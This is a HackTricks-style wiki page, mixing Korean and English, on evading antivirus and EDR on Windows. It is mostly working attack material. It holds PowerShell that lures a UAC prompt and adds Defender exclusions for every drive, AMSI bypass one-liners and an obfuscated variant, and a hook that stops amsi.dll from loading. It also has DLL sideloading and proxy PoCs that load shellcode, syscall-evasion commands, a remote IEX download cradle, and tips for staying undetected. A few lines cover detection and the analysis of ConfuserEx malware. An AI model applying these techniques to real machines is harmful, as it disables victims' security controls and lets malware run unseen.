# 안티바이러스(AV) 우회

{{#include ../banners/hacktricks-training.md}}

**이 페이지는 처음에 작성되었습니다** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않도록 하는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender를 무력화하는 도구.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender를 조작하기 전의 설치 프로그램 스타일 UAC 유인

게임 치트로 가장한 공개 로더들은 종종 서명되지 않은 Node.js/Nexe 설치 프로그램으로 배포되며, 먼저 **사용자에게 권한 상승을 요청**한 다음에야 Defender를 무력화합니다. 흐름은 단순합니다:

1. 관리자 컨텍스트인지 `net session`으로 검사합니다. 이 명령은 호출자가 관리자 권한을 가지고 있을 때만 성공하므로, 실패하면 로더가 표준 사용자로 실행 중임을 의미합니다.
2. 원본 명령줄을 유지한 채 `RunAs` verb로 즉시 자체를 재실행하여 예상되는 UAC 동의 프롬프트를 유발합니다.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Victims already believe they are installing “cracked” software, so the prompt is usually accepted, giving the malware the rights it needs to change Defender’s policy.

### Blanket `MpPreference` exclusions for every drive letter

권한 상승 후, GachiLoader-style 체인은 서비스를 완전히 비활성화하는 대신 Defender의 사각지대를 최대화한다. 로더는 먼저 GUI 워치독(`taskkill /F /IM SecHealthUI.exe`)을 종료한 다음, **매우 광범위한 제외**를 적용해 모든 사용자 프로필, 시스템 디렉터리 및 제거 가능한 디스크가 스캔 불가능하도록 만든다:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- 루프는 모든 마운트된 파일 시스템(D:\, E:\, USB sticks, etc.)을 순회하므로 **디스크의 어느 위치에 새로 떨어지는 페이로드도 무시된다**.
- `.sys` 확장자 제외 규칙은 미래를 대비한 것으로, 공격자는 나중에 Defender를 다시 건드리지 않고도 서명되지 않은 드라이버를 로드할 선택권을 남겨둔다.
- 모든 변경사항은 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 아래에 저장되므로 이후 단계에서 제외 항목이 유지되는지 확인하거나 UAC를 다시 트리거하지 않고 확장할 수 있다.

어떤 Defender 서비스도 중지되지 않기 때문에, 단순한 헬스 체크는 “antivirus active”로 계속 보고하지만 실시간 검사(real-time inspection)는 해당 경로들을 전혀 검사하지 않는다.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection은 바이너리나 스크립트 안의 알려진 악성 문자열이나 바이트 배열을 플래그하거나 파일 자체에서 정보를 추출(e.g. file description, company name, digital signatures, icon, checksum, etc.)함으로써 이루어진다. 이는 알려진 공개 도구를 사용하면 이미 분석되어 악성으로 표시되었을 가능성이 높아 더 쉽게 잡힐 수 있다는 뜻이다. 이러한 검출을 우회할 수 있는 몇 가지 방법은 다음과 같다:

- **Encryption**

바이너리를 암호화하면 AV가 프로그램을 감지할 방법이 없어지지만, 이를 복호화해 메모리에서 실행할 로더가 필요하다.

- **Obfuscation**

때로는 바이너리나 스크립트의 일부 문자열만 변경해도 AV를 통과할 수 있지만, 무엇을 난독화하려는지에 따라 시간이 많이 걸릴 수 있다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 시그니처가 존재하지 않겠지만, 많은 시간과 노력이 든다.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

실무적인 AV Evasion에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 강력히 추천한다.

### **Dynamic analysis**

Dynamic analysis는 AV가 바이너리를 sandbox에서 실행하고 악성 행위를 모니터링하는 경우를 말한다 (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). 이 부분은 다루기 다소 까다로울 수 있지만, sandbox를 회피하기 위해 할 수 있는 몇 가지 방법은 다음과 같다.

- **Sleep before execution** 구현 방식에 따라 AV의 dynamic analysis를 우회하는 좋은 방법이 될 수 있다. AV는 사용자의 워크플로우를 방해하지 않기 위해 파일을 스캔하는 시간이 매우 짧기 때문에 긴 sleep을 사용하면 바이너리 분석을 방해할 수 있다. 문제는 많은 AV의 sandboxes가 구현 방식에 따라 sleep을 건너뛸 수 있다는 점이다.
- **Checking machine's resources** 일반적으로 Sandboxes는 사용할 수 있는 리소스가 매우 적다 (e.g. < 2GB RAM), 그렇지 않으면 사용자 기기를 느리게 할 수 있다. 여기서 창의적으로 접근할 수 있는데, 예를 들어 CPU의 온도나 팬 속도를 확인하는 등 모든 것이 sandbox에 구현되어 있지는 않다.
- **Machine-specific checks** 사용자가 워크스테이션이 "contoso.local" 도메인에 가입된 특정 사용자를 타깃으로 하고 싶다면, 컴퓨터의 도메인이 지정한 도메인과 일치하는지 확인할 수 있다. 일치하지 않으면 프로그램을 종료하게 만들면 된다.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

앞서 말했듯이 이 글에서 **public tools**는 결국 **get detected**된다. 따라서 스스로에게 이렇게 물어봐야 한다:

예를 들어 LSASS를 덤프하려면, **do you really need to use mimikatz**? 아니면 덜 알려진 다른 프로젝트로도 LSASS를 덤프할 수 있는가?

정답은 아마 후자일 것이다. mimikatz를 예로 들면, 프로젝트 자체는 훌륭하지만 AVs와 EDRs에 의해 아마도 가장(또는 그 중 하나로) 많이 플래그된 툴이다. AV를 우회하려고 작업하기에는 악몽과 같으니, 달성하려는 목적에 맞는 대안을 찾아라.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

가능하다면 항상 **prioritize using DLLs for evasion**. 내 경험상 DLL 파일은 보통 **way less detected**되고 분석되므로, (페이로드가 DLL로 실행될 방법이 있다면) 탐지를 피하기 위한 아주 간단한 트릭이 된다.

이 이미지에서 볼 수 있듯 Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 탐지율을 보였고, EXE 페이로드는 7/26의 탐지율을 보였다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

이제 DLL 파일로 훨씬 더 은밀해질 수 있는 몇 가지 트릭을 보여주겠다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 로더가 사용하는 DLL 검색 순서를 악용해 피해자 애플리케이션과 악성 페이로드를 서로 인접하게 배치하는 기법이다.

DLL Sideloading에 취약한 프로그램은 [Siofra](https://github.com/Cybereason/siofra)와 다음 powershell 스크립트를 사용해 확인할 수 있다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내부에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램들이 로드하려 하는 DLL 파일들을 출력합니다.

저는 **explore DLL Hijackable/Sideloadable programs yourself**를 강력히 권장합니다. 이 기법은 제대로 사용하면 꽤 은밀하지만, 공개적으로 알려진 DLL Sideloadable 프로그램을 사용하면 쉽게 발각될 수 있습니다.

프로그램이 로드하기를 기대하는 이름으로 악성 DLL을 단순히 배치하는 것만으로는 페이로드가 실행되지 않습니다. 프로그램은 해당 DLL 내부에 특정 함수들을 기대하기 때문입니다. 이 문제를 해결하기 위해 우리는 **DLL Proxying/Forwarding**이라는 다른 기법을 사용할 것입니다.

**DLL Proxying**은 프록시(및 악성) DLL이 프로그램에 의해 이루어지는 호출을 원래 DLL로 전달함으로써 프로그램의 기능을 유지하고 페이로드 실행을 처리할 수 있게 합니다.

저는 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 [@flangvik](https://twitter.com/Flangvik/)로부터 사용할 것입니다.

제가 수행한 단계는 다음과 같습니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 2개의 파일을 만듭니다: DLL 소스 코드 템플릿과 원본의 이름이 바뀐 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 shellcode ([SGN](https://github.com/EgeBalci/sgn)으로 인코딩된)와 프록시 DLL은 [antiscan.me](https://antiscan.me)에서 모두 0/26 탐지율을 기록했습니다! 성공이라고 부를 만합니다.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 나는 **강력히 권장합니다** [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)를 시청하여 DLL Sideloading에 대해 우리가 논의한 내용을 더 깊이 있게 이해하세요.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE 모듈은 실제로 "forwarders"인 함수를 export할 수 있습니다: 코드로 가리키는 대신, export 엔트리는 `TargetDll.TargetFunc` 형태의 ASCII 문자열을 포함합니다. 호출자가 export를 해석하면, Windows loader는 다음을 수행합니다:

- 이미 로드되어 있지 않다면 `TargetDll`을 로드합니다
- 그로부터 `TargetFunc`를 해결합니다

이해해야 할 핵심 동작:
- `TargetDll`가 KnownDLL인 경우, 보호된 KnownDLLs 네임스페이스(예: ntdll, kernelbase, ole32)에서 제공됩니다.
- `TargetDll`가 KnownDLL이 아닌 경우, 일반 DLL 검색 순서가 사용되며, 여기에는 forward resolution을 수행하는 모듈의 디렉터리가 포함됩니다.

이 동작은 간접적인 sideloading primitive를 가능하게 합니다: 함수가 non-KnownDLL 모듈 이름으로 forward된 signed DLL을 찾은 다음, 그 서명된 DLL과 동일한 디렉터리에 forwarding 대상 모듈 이름과 정확히 일치하는 공격자가 제어하는 DLL을 배치합니다. forwarded export가 호출되면, loader는 forward를 해석하여 동일한 디렉터리에서 당신의 DLL을 로드하고 DllMain을 실행합니다.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서로 해결됩니다.

PoC (copy-paste):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더에 복사
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을 배치합니다. 최소한의 DllMain만으로 코드 실행이 가능하며, DllMain을 트리거하기 위해 전달된 함수를 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 전달을 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
관찰된 동작:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- `KeyIsoSetAuditingInterface`를 해결하는 동안, 로더는 포워드 대상인 `NCRYPTPROV.SetAuditingInterface`로 따라갑니다
- 그런 다음 로더는 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 그 `DllMain`을 실행합니다
- `SetAuditingInterface`가 구현되어 있지 않다면, `DllMain`이 이미 실행된 이후에야 "missing API" 오류가 발생합니다

Hunting tips:
- 대상 모듈이 KnownDLL이 아닌 forwarded exports에 집중하세요. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`에 나열되어 있습니다.
- 다음과 같은 도구로 forwarded exports를 열거할 수 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 검색하려면 Windows 11 forwarder 인벤토리를 참조: https://hexacorn.com/d/apis_fwd.txt

탐지/방어 아이디어:
- 모니터링: LOLBins (예: rundll32.exe)가 비시스템 경로에서 서명된 DLL을 로드한 다음 해당 디렉터리에서 동일한 베이스 이름을 가진 non-KnownDLLs를 로드하는 경우
- 다음과 같은 프로세스/모듈 체인에 대해 경고: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` (사용자 쓰기 가능 경로에서)
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 쓰기+실행을 거부

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 suspended processes, direct syscalls, and alternative execution methods를 사용하여 EDRs를 우회하는 payload toolkit입니다`

Freeze를 사용하여 shellcode를 은밀한 방식으로 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion은 단순한 쫓고 쫓기는 게임입니다. 오늘 통하는 기법이 내일에는 탐지될 수 있으니, 가능한 한 하나의 도구에만 의존하지 말고 여러 evasion 기법을 연쇄적으로 조합해 보세요.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs는 종종 `ntdll.dll`의 syscall stub에 **user-mode inline hooks**를 걸어둡니다. 이러한 후킹을 우회하려면, 올바른 **SSN**(System Service Number)을 로드하고 후킹된 export entrypoint를 실행하지 않고 커널 모드로 전환하는 **direct** 또는 **indirect** syscall stub을 생성할 수 있습니다.

**Invocation options:**
- **Direct (embedded)**: 생성된 stub에 `syscall`/`sysenter`/`SVC #0` 명령어를 삽입합니다 (ntdll export를 호출하지 않음).
- **Indirect**: `ntdll` 내의 기존 `syscall` gadget으로 점프하여 커널 전환이 `ntdll`에서 시작된 것처럼 보이게 합니다(휴리스틱 회피에 유용). **randomized indirect**는 호출마다 풀에서 gadget을 무작위로 선택합니다.
- **Egg-hunt**: 디스크에 정적 `0F 05` opcode 시퀀스를 남기지 않기 위해 런타임에 syscall 시퀀스를 해석합니다.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub 바이트를 읽지 않고 가상 주소(VA)로 syscall stub들을 정렬하여 SSN을 추론합니다.
- **SyscallsFromDisk**: 깨끗한 `\KnownDlls\ntdll.dll`을 매핑하여 그 `.text`에서 SSN을 읽은 다음 언매핑합니다(메모리 상의 모든 후킹을 우회).
- **RecycledGate**: VA 정렬 기반 SSN 추론을 opcode 검증과 결합하여 stub이 깨끗할 때는 검증을 사용하고, 후킹된 경우 VA 추론으로 대체합니다.
- **HW Breakpoint**: `syscall` 명령어에 대해 DR0을 설정하고 VEH를 사용해 런타임에 `EAX`에서 SSN을 캡처합니다. 이 방식은 후킹된 바이트를 파싱하지 않습니다.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 초기에는 AV가 **files on disk**만 스캔할 수 있었기 때문에 페이로드를 **directly in-memory**로 실행할 수 있다면 AV는 충분한 가시성이 없어 아무런 조치를 취할 수 없었습니다.

AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

AMSI는 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출함으로써 안티바이러스 솔루션이 스크립트 동작을 검사할 수 있게 합니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 경고가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 앞에 붙이고 스크립트가 실행된 실행파일의 경로(이 경우 powershell.exe)를 표시하는 것을 확인할 수 있습니다.

우리는 디스크에 어떤 파일도 떨어뜨리지 않았지만 AMSI 때문에 in-memory에서 잡혔습니다.

또한 **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`를 통한 인메모리 로드에도 영향을 미칩니다. 따라서 AMSI를 회피하고자 인메모리 실행을 할 경우에는 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지가 있습니다:

- **Obfuscation**

AMSI는 주로 정적 탐지로 동작하기 때문에 로드하려는 스크립트를 수정하는 것은 탐지를 회피하는 좋은 방법이 될 수 있습니다.

하지만 AMSI는 여러 레이어의 난독화가 있더라도 스크립트를 역난독화할 수 있는 능력이 있으므로, 난독화는 어떻게 하느냐에 따라 좋지 않은 선택이 될 수 있습니다. 따라서 단순히 회피하는 것이 그리 간단하지 않을 수 있습니다. 다만 경우에 따라 변수 이름 몇 개만 바꾸어도 충분한 경우도 있으므로, 얼마나 심하게 플래그되었는지에 따라 다릅니다.

- **AMSI Bypass**

AMSI는 powershell 프로세스(및 cscript.exe, wscript.exe 등)로 DLL을 로드하는 방식으로 구현되어 있기 때문에, 권한이 없는 사용자로 동작 중에도 쉽게 변조할 수 있습니다. AMSI 구현의 이 결함 때문에 연구자들은 AMSI 스캐닝을 회피할 수 있는 여러 방법을 발견했습니다.

**Forcing an Error**

AMSI 초기화가 실패하도록 강제하면(amsiInitFailed) 현재 프로세스에 대해 스캔이 시작되지 않습니다. 원래 이것은 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었고, Microsoft는 보다 광범위한 사용을 방지하기 위해 시그니처를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
단 한 줄의 powershell 코드로 현재 powershell 프로세스에서 AMSI를 무력화할 수 있었다. 물론 그 한 줄은 AMSI 자체에 의해 탐지되었으므로, 이 기술을 사용하려면 약간의 수정이 필요하다.

아래는 내가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기술은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)가 발견했으며, amsi.dll의 "AmsiScanBuffer" 함수 주소를 찾아 사용자 입력을 스캔하는 동작을 담당하는 해당 함수를 E_INVALIDARG 코드를 반환하도록 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔 결과가 0을 반환해 클린한 결과로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 참조하세요.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI 차단 — amsi.dll 로드 방지 (LdrLoadDll hook)

AMSI는 현재 프로세스에 `amsi.dll`이 로드된 이후에야 초기화됩니다. 언어에 무관한 안정적인 우회 방법은 요청된 모듈이 `amsi.dll`일 때 오류를 반환하도록 `ntdll!LdrLoadDll`에 user‑mode hook을 거는 것입니다. 그 결과 AMSI는 로드되지 않으며 해당 프로세스에 대해서는 스캔이 수행되지 않습니다.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
참고
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- 긴 명령행 흔적을 피하기 위해 stdin으로 스크립트를 전달하는 것(`PowerShell.exe -NoProfile -NonInteractive -Command -`)과 함께 사용하세요.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**감지된 시그니처 제거**

다음과 같은 도구를 사용하여 현재 프로세스의 메모리에서 감지된 AMSI 시그니처를 제거할 수 있습니다: **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**. 이 도구들은 현재 프로세스의 메모리를 스캔하여 AMSI 시그니처를 찾고, 해당 부분을 NOP 명령으로 덮어써서 메모리에서 사실상 제거합니다.

**AMSI를 사용하는 AV/EDR 제품**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**PowerShell 버전 2 사용**
PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 스크립트가 AMSI에 의해 스캔되지 않고 실행됩니다. 다음과 같이 할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있는 기능입니다. 감사 및 문제 해결에 유용할 수 있지만, 탐지를 회피하려는 공격자에게는 **문제가 될 수 있습니다**.

PowerShell logging을 우회하려면 다음 기술을 사용할 수 있습니다:

- **Disable PowerShell Transcription and Module Logging**: 이를 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI에 의해 스캔되지 않고 스크립트를 실행할 수 있습니다. 다음과 같이 실행하세요: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 방어 기능이 없는 powershell을 생성하려면 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 를 사용하세요 (이것이 `powerpick`이 Cobal Strike에서 사용하는 방식입니다).


## Obfuscation

> [!TIP]
> 여러 obfuscation 기법은 데이터를 암호화하는 데 의존하며, 이는 바이너리의 엔트로피를 증가시켜 AVs와 EDRs가 더 쉽게 탐지할 수 있게 만듭니다. 이 점을 주의하고 암호화는 민감하거나 숨겨야 할 코드의 특정 섹션에만 적용하는 것이 좋습니다.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 상용 포크)를 사용하는 malware를 분석할 때는 디컴파일러와 샌드박스를 차단하는 여러 보호 계층에 직면하는 경우가 많습니다. 아래 워크플로우는 이후 dnSpy 또는 ILSpy 같은 도구로 C#으로 디컴파일할 수 있는 거의 원래의 IL을 안정적으로 **복원**합니다.

1.  Anti-tampering removal – ConfuserEx는 모든 *method body*를 암호화하고 *module* 정적 생성자(`<Module>.cctor`) 내부에서 복호화합니다. 또한 PE 체크섬을 패치하여 어떤 수정도 바이너리를 충돌시킵니다. 암호화된 메타데이터 테이블을 찾아 XOR 키를 복구하고 깨끗한 어셈블리를 다시 쓰려면 **AntiTamperKiller**를 사용하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 자체 언패커를 만들 때 유용할 수 있는 6개의 anti-tamper 매개변수(`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  Symbol / control-flow recovery – *clean* 파일을 ConfuserEx를 인식하는 de4dot 포크인 **de4dot-cex**에 넣으세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 프로필 선택  
• de4dot은 control-flow flattening을 되돌리고, 원래의 namespaces, classes 및 변수 이름을 복원하며 상수 문자열을 복호화합니다.

3.  Proxy-call stripping – ConfuserEx는 직접적인 메서드 호출을 경량 래퍼(일명 *proxy calls*)로 대체하여 디컴파일을 더 어렵게 만듭니다. 이를 제거하려면 **ProxyCall-Remover**를 사용하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 불투명한 래퍼 함수(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String`이나 `AES.Create()` 같은 일반적인 .NET API를 볼 수 있어야 합니다.

4.  Manual clean-up – 결과 바이너리를 dnSpy에서 열고 큰 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색하여 *실제* 페이로드를 찾으세요. 종종 malware는 이것을 `<Module>.byte_0` 안에 초기화된 TLV-인코딩 바이트 배열로 저장합니다.

위의 체인은 악성 샘플을 실행하지 않고도 실행 흐름을 **복원**하므로 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성하며, 이를 IOC로 사용해 샘플을 자동으로 분류하는 데 사용할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): The aim of this project is to provide an open-source fork of the [LLVM](http://www.llvm.org/) compilation suite able to provide increased software security through [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) and tamper-proofing.
